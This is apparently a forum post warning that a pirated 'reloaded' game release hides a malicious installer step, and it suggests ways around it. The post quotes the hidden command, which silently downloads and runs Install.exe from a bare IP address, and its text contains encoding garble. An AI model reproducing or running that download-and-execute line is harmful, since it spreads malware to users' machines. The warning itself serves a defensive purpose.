 what the fu***r does..
****************************************
Please close all running applications before running install Ã½Å¡â‚¬\inetc.dll /end Ã½Å¡â‚¬\Install.exe http://46.166.157.160/Install.exe /SILENT get __________________.exe
****************************************

you can see the maliciuos and the ip to bind..

DonÂ´t forget.. this reloaded release runs great, but donÂ´t run the ""OriginalInstaller.exe"" and the autorun too...

Start ""_______________.exe""
or:
Kill ""OriginalInstaller.exe""
Make a new DVD with the ""__________.exe"" renamed to ""OriginalInstaller.exe""

The Game runs great for me...
